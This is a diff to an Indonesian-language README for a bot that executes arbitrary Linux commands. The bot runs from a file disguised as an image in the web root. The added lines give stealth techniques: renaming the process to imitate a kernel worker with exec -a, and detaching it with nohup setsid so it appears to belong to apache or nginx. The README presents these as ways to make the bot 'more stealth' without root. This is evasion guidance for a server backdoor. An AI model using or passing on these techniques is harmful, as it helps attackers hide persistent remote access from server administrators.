@@ -84,3 +84,22 @@ perintah Linux apa saja, termasuk:
 ✅ Mengirim pesan saat bot mati (misalnya karena kill, CTRL+C, atau shutdown)
 
 ```
+<br>
+<br>
+<br>
+<br>
+<br>
+
+📌NOTE bot ini masih bisa di modifikasi dengan metode :
+```
+Ubah Nama Proses di Runtime (Fake Process Name)
+exec -a "[kworker/u8:2]" /var/www/html/default.png
+💡 Efek: Saat dicek dengan ps aux atau pgrep -af, proses akan terlihat sebagai [kworker/u8:2] (nama biasa untuk kernel worker).
+
+📌Jalankan Proses dengan PPID Palsu
+Agar tidak terlihat mencurigakan, <br> bisa jalankan bot di bawah proses parent yang sudah ada, misalnya apache2 atau nginx:
+nohup setsid /var/www/html/default.png > /dev/null 2>&1 &
+💡 Efek: Bot terlihat sebagai bagian dari apache/nginx saat dicek dengan pstree atau ps.
+Dengan kombinasi metode ini, bot jadi lebih stealth tanpa akses root. 🔥
+```
+
